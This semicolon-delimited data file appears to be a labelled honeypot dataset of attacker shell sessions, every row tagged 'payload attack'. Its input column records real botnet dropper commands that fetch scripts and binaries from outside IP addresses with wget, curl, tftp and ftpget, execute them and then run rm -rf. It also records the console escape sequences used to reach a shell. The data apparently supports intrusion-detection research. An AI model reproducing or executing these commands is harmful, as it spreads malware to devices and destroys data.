Unnamed: 0;session;duration;command_freq;input;attack_cat;label_nr;label_desc
22209;1f457717f96e;2,83986E+15;26;"/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'";Malicious activity;2;payload attack
22210;1f457717f96e;2,83986E+15;26;wget;Malicious activity;2;payload attack
22211;1f457717f96e;2,83986E+15;26;tftp;Malicious activity;2;payload attack
22212;1f457717f96e;2,83986E+15;26;ftpget;Malicious activity;2;payload attack
22213;1f457717f96e;2,83986E+15;26;"/bin/busybox wget http://185.243.56.167/bot_mips_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.mips; (rm -rf .f || rm .f); (rm -rf .m || rm .m)";Malicious activity;2;payload attack
22214;1f457717f96e;2,83986E+15;26;wget http://185.243.56.167/bot_mips_el -O-;Malicious activity;2;payload attack
19060;6b2e92837493;2,88139E+15;19;start;Malicious activity;2;payload attack
19061;6b2e92837493;2,88139E+15;19;start;Malicious activity;2;payload attack
19062;6b2e92837493;2,88139E+15;19;enable;Malicious activity;2;payload attack
19063;6b2e92837493;2,88139E+15;19;config terminal;Malicious activity;2;payload attack
19064;6b2e92837493;2,88139E+15;19;config terminal;Malicious activity;2;payload attack
19065;6b2e92837493;2,88139E+15;19;system;Malicious activity;2;payload attack
19066;6b2e92837493;2,88139E+15;19;system;Malicious activity;2;payload attack
19067;6b2e92837493;2,88139E+15;19;linuxshell;Malicious activity;2;payload attack
19068;6b2e92837493;2,88139E+15;19;linuxshell;Malicious activity;2;payload attack
19069;6b2e92837493;2,88139E+15;19;su;Malicious activity;2;payload attack
19070;6b2e92837493;2,88139E+15;19;shell;Malicious activity;2;payload attack
19071;6b2e92837493;2,88139E+15;19;shell;Malicious activity;2;payload attack
19072;6b2e92837493;2,88139E+15;19;sh;Malicious activity;2;payload attack
19073;6b2e92837493;2,88139E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
19074;6b2e92837493;2,88139E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
19075;6b2e92837493;2,88139E+15;19;"/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
19076;6b2e92837493;2,88139E+15;19;wget;Malicious activity;2;payload attack
19077;6b2e92837493;2,88139E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
19078;6b2e92837493;2,88139E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'";Malicious activity;2;payload attack
17492;d0ca7f2c48b3;3,009E+15;19;start;Malicious activity;2;payload attack
17493;d0ca7f2c48b3;3,009E+15;19;start;Malicious activity;2;payload attack
17494;d0ca7f2c48b3;3,009E+15;19;enable;Malicious activity;2;payload attack
17495;d0ca7f2c48b3;3,009E+15;19;config terminal;Malicious activity;2;payload attack
17496;d0ca7f2c48b3;3,009E+15;19;config terminal;Malicious activity;2;payload attack
17497;d0ca7f2c48b3;3,009E+15;19;system;Malicious activity;2;payload attack
17498;d0ca7f2c48b3;3,009E+15;19;system;Malicious activity;2;payload attack
17499;d0ca7f2c48b3;3,009E+15;19;linuxshell;Malicious activity;2;payload attack
17500;d0ca7f2c48b3;3,009E+15;19;linuxshell;Malicious activity;2;payload attack
17501;d0ca7f2c48b3;3,009E+15;19;su;Malicious activity;2;payload attack
17502;d0ca7f2c48b3;3,009E+15;19;shell;Malicious activity;2;payload attack
17503;d0ca7f2c48b3;3,009E+15;19;shell;Malicious activity;2;payload attack
17504;d0ca7f2c48b3;3,009E+15;19;sh;Malicious activity;2;payload attack
17505;d0ca7f2c48b3;3,009E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
17506;d0ca7f2c48b3;3,009E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
17507;d0ca7f2c48b3;3,009E+15;19;"/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
17508;d0ca7f2c48b3;3,009E+15;19;wget;Malicious activity;2;payload attack
17509;d0ca7f2c48b3;3,009E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
17510;d0ca7f2c48b3;3,009E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://27.45.90.129:52880/i; curl -O http://27.45.90.129:52880/i; /bin/busybox wget http://27.45.90.129:52880/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'";Malicious activity;2;payload attack
17085;70c2a5f4a1ae;3,01926E+15;19;start;Malicious activity;2;payload attack
17086;70c2a5f4a1ae;3,01926E+15;19;start;Malicious activity;2;payload attack
17087;70c2a5f4a1ae;3,01926E+15;19;enable;Malicious activity;2;payload attack
17088;70c2a5f4a1ae;3,01926E+15;19;config terminal;Malicious activity;2;payload attack
17089;70c2a5f4a1ae;3,01926E+15;19;config terminal;Malicious activity;2;payload attack
17090;70c2a5f4a1ae;3,01926E+15;19;system;Malicious activity;2;payload attack
17091;70c2a5f4a1ae;3,01926E+15;19;system;Malicious activity;2;payload attack
17092;70c2a5f4a1ae;3,01926E+15;19;linuxshell;Malicious activity;2;payload attack
17093;70c2a5f4a1ae;3,01926E+15;19;linuxshell;Malicious activity;2;payload attack
17094;70c2a5f4a1ae;3,01926E+15;19;su;Malicious activity;2;payload attack
17095;70c2a5f4a1ae;3,01926E+15;19;shell;Malicious activity;2;payload attack
17096;70c2a5f4a1ae;3,01926E+15;19;shell;Malicious activity;2;payload attack
17097;70c2a5f4a1ae;3,01926E+15;19;sh;Malicious activity;2;payload attack
17098;70c2a5f4a1ae;3,01926E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
17099;70c2a5f4a1ae;3,01926E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
17100;70c2a5f4a1ae;3,01926E+15;19;"/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
17101;70c2a5f4a1ae;3,01926E+15;19;wget;Malicious activity;2;payload attack
17102;70c2a5f4a1ae;3,01926E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
17103;70c2a5f4a1ae;3,01926E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'";Malicious activity;2;payload attack
22801;34f853195a8e;3,0205E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
21213;f523f7a22b7d;3,02813E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
20619;b609c17ed3a6;3,03064E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
19528;98eaf3db18fd;3,03242E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
23766;d0a97f113981;3,03297E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
22802;76d681d517a2;3,03361E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
23765;1555319a4bc7;3,03412E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
17021;4523878061d2;3,03622E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
15681;42e7c287bac6;3,03768E+15;1;"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.160.54/onion002; curl -O http://45.90.160.54/onion002; chmod 777 onion002; sh onion002; tftp 45.90.160.54 -c get onion002.sh; chmod 777 onion002.sh; sh onion002.sh; tftp -r .sh -g 45.90.160.54; chmod 777 onion002; sh onion002; ftpget -v -u anonymous -p anonymous -P 21 45.90.160.54 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *";Malicious activity;2;payload attack
9259;813386b41d62;3,03841E+15;1;"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.105/onions1337; curl -O http://45.90.161.105/onions1337; chmod 777 onions1337; sh onions1337; tftp 45.90.161.105 -c get bins.sh; chmod 777 onions1337; sh onions1337; tftp -r .sh -g 45.90.161.105; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.90.161.105 .sh .sh; sh .sh; rm -rf sh onions1337 .sh .sh; rm -rf *";Malicious activity;2;payload attack
9260;49f90a4d1e98;3,03925E+15;1;"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.105/onions1337; curl -O http://45.90.161.105/onions1337; chmod 777 onions1337; sh onions1337; tftp 45.90.161.105 -c get bins.sh; chmod 777 onions1337; sh onions1337; tftp -r .sh -g 45.90.161.105; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.90.161.105 .sh .sh; sh .sh; rm -rf sh onions1337 .sh .sh; rm -rf *";Malicious activity;2;payload attack
21212;63e38427cf60;3,03985E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
19527;8535516760c1;3,04228E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
19529;b47dd812b897;3,04268E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
23597;30bfc8eeb882;3,04944E+15;1;"cd /tmp || cd /run || cd /; wget http://212.192.241.44/Gbotbins.sh; chmod 777 Gbotbins.sh; sh Gbotbins.sh; tftp 212.192.241.44 -c get Gbottftp1.sh; chmod 777 Gbottftp1.sh; sh Gbottftp1.sh; tftp -r Gbottftp2.sh -g 212.192.241.44; chmod 777 Gbottftp2.sh; sh Gbottftp2.sh; rm -rf Gbotbins.sh Gbottftp1.sh Gbottftp2.sh; rm -rf *";Malicious activity;2;payload attack
13318;3b9caa6cfb51;3,05515E+15;1;"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.235.203/0x83911d24Fx.sh; curl -O http://213.232.235.203/0x83911d24Fx.sh; chmod 777 0x83911d24Fx.sh; sh 0x83911d24Fx.sh; tftp 157.230.119.179 -c get 0xt984767.sh; chmod 777 0xft6426467.sh; sh 0xft6426467.sh; tftp -r 0xtf2984767.sh -g 157.230.119.179 ; chmod 777 0xtf2984767.sh; sh 0xtf2984767.sh; ftpget -v -u anonymous -p anonymous -P 21 157.230.119.179 0xft6426467.sh 0xft6426467.sh; sh 0xft6426467.sh; rm -rf 0xt984767.sh 0xtf2984767.sh 0xft6426467.sh; rm -rf *";Malicious activity;2;payload attack
17925;ffbe02f29062;3,09288E+15;19;start;Malicious activity;2;payload attack
17926;ffbe02f29062;3,09288E+15;19;start;Malicious activity;2;payload attack
17927;ffbe02f29062;3,09288E+15;19;enable;Malicious activity;2;payload attack
17928;ffbe02f29062;3,09288E+15;19;config terminal;Malicious activity;2;payload attack
17929;ffbe02f29062;3,09288E+15;19;config terminal;Malicious activity;2;payload attack
17930;ffbe02f29062;3,09288E+15;19;system;Malicious activity;2;payload attack
17931;ffbe02f29062;3,09288E+15;19;system;Malicious activity;2;payload attack
17932;ffbe02f29062;3,09288E+15;19;linuxshell;Malicious activity;2;payload attack
17933;ffbe02f29062;3,09288E+15;19;linuxshell;Malicious activity;2;payload attack
17934;ffbe02f29062;3,09288E+15;19;su;Malicious activity;2;payload attack
17935;ffbe02f29062;3,09288E+15;19;shell;Malicious activity;2;payload attack
17936;ffbe02f29062;3,09288E+15;19;shell;Malicious activity;2;payload attack
17937;ffbe02f29062;3,09288E+15;19;sh;Malicious activity;2;payload attack
17938;ffbe02f29062;3,09288E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
17939;ffbe02f29062;3,09288E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
17940;ffbe02f29062;3,09288E+15;19;"/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
17941;ffbe02f29062;3,09288E+15;19;wget;Malicious activity;2;payload attack
17942;ffbe02f29062;3,09288E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
17943;ffbe02f29062;3,09288E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://112.91.74.109:59619/i; curl -O http://112.91.74.109:59619/i; /bin/busybox wget http://112.91.74.109:59619/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'";Malicious activity;2;payload attack
20528;1874f078b499;3,11398E+15;19;start;Malicious activity;2;payload attack
20529;1874f078b499;3,11398E+15;19;start;Malicious activity;2;payload attack
20530;1874f078b499;3,11398E+15;19;enable;Malicious activity;2;payload attack
20531;1874f078b499;3,11398E+15;19;config terminal;Malicious activity;2;payload attack
20532;1874f078b499;3,11398E+15;19;config terminal;Malicious activity;2;payload attack
20533;1874f078b499;3,11398E+15;19;system;Malicious activity;2;payload attack
20534;1874f078b499;3,11398E+15;19;system;Malicious activity;2;payload attack
20535;1874f078b499;3,11398E+15;19;linuxshell;Malicious activity;2;payload attack
20536;1874f078b499;3,11398E+15;19;linuxshell;Malicious activity;2;payload attack
20537;1874f078b499;3,11398E+15;19;su;Malicious activity;2;payload attack
20538;1874f078b499;3,11398E+15;19;shell;Malicious activity;2;payload attack
20539;1874f078b499;3,11398E+15;19;shell;Malicious activity;2;payload attack
20540;1874f078b499;3,11398E+15;19;sh;Malicious activity;2;payload attack
20541;1874f078b499;3,11398E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
20542;1874f078b499;3,11398E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
20543;1874f078b499;3,11398E+15;19;"/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
20544;1874f078b499;3,11398E+15;19;wget;Malicious activity;2;payload attack
20545;1874f078b499;3,11398E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
20546;1874f078b499;3,11398E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'";Malicious activity;2;payload attack
21008;57bbb1d1ce01;3,11725E+15;19;start;Malicious activity;2;payload attack
21009;57bbb1d1ce01;3,11725E+15;19;start;Malicious activity;2;payload attack
21010;57bbb1d1ce01;3,11725E+15;19;enable;Malicious activity;2;payload attack
21011;57bbb1d1ce01;3,11725E+15;19;config terminal;Malicious activity;2;payload attack
21012;57bbb1d1ce01;3,11725E+15;19;config terminal;Malicious activity;2;payload attack
21013;57bbb1d1ce01;3,11725E+15;19;system;Malicious activity;2;payload attack
21014;57bbb1d1ce01;3,11725E+15;19;system;Malicious activity;2;payload attack
21015;57bbb1d1ce01;3,11725E+15;19;linuxshell;Malicious activity;2;payload attack
21016;57bbb1d1ce01;3,11725E+15;19;linuxshell;Malicious activity;2;payload attack
21017;57bbb1d1ce01;3,11725E+15;19;su;Malicious activity;2;payload attack
21018;57bbb1d1ce01;3,11725E+15;19;shell;Malicious activity;2;payload attack
21019;57bbb1d1ce01;3,11725E+15;19;shell;Malicious activity;2;payload attack
21020;57bbb1d1ce01;3,11725E+15;19;sh;Malicious activity;2;payload attack
21021;57bbb1d1ce01;3,11725E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
21022;57bbb1d1ce01;3,11725E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
21023;57bbb1d1ce01;3,11725E+15;19;"/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
21024;57bbb1d1ce01;3,11725E+15;19;wget;Malicious activity;2;payload attack
21025;57bbb1d1ce01;3,11725E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
21026;57bbb1d1ce01;3,11725E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'";Malicious activity;2;payload attack
21525;78081fc58b2b;3,12119E+15;19;start;Malicious activity;2;payload attack
21526;78081fc58b2b;3,12119E+15;19;start;Malicious activity;2;payload attack
21527;78081fc58b2b;3,12119E+15;19;enable;Malicious activity;2;payload attack
21528;78081fc58b2b;3,12119E+15;19;config terminal;Malicious activity;2;payload attack
21529;78081fc58b2b;3,12119E+15;19;config terminal;Malicious activity;2;payload attack
21530;78081fc58b2b;3,12119E+15;19;system;Malicious activity;2;payload attack
21531;78081fc58b2b;3,12119E+15;19;system;Malicious activity;2;payload attack
21532;78081fc58b2b;3,12119E+15;19;linuxshell;Malicious activity;2;payload attack
21533;78081fc58b2b;3,12119E+15;19;linuxshell;Malicious activity;2;payload attack
21534;78081fc58b2b;3,12119E+15;19;su;Malicious activity;2;payload attack
21535;78081fc58b2b;3,12119E+15;19;shell;Malicious activity;2;payload attack
21536;78081fc58b2b;3,12119E+15;19;shell;Malicious activity;2;payload attack
21537;78081fc58b2b;3,12119E+15;19;sh;Malicious activity;2;payload attack
21538;78081fc58b2b;3,12119E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
21539;78081fc58b2b;3,12119E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
21540;78081fc58b2b;3,12119E+15;19;"/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
21541;78081fc58b2b;3,12119E+15;19;wget;Malicious activity;2;payload attack
21542;78081fc58b2b;3,12119E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
21543;78081fc58b2b;3,12119E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'";Malicious activity;2;payload attack
23729;23df1ff81300;3,14157E+15;19;start;Malicious activity;2;payload attack
23730;23df1ff81300;3,14157E+15;19;start;Malicious activity;2;payload attack
